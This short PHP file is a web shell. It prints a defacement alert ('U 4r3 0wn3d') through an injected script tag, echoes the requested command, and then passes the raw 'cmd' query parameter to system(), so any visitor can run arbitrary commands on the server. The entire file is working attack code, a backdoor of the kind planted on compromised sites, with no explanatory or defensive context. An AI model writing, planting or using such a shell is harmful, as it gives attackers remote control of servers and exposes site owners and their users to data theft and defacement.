<?php
echo "<script>alert(U 4r3 0wn3d);</script>";
echo "Run command: ".htmlspecialchars($_GET['cmd']);

system($_GET['cmd']);
?>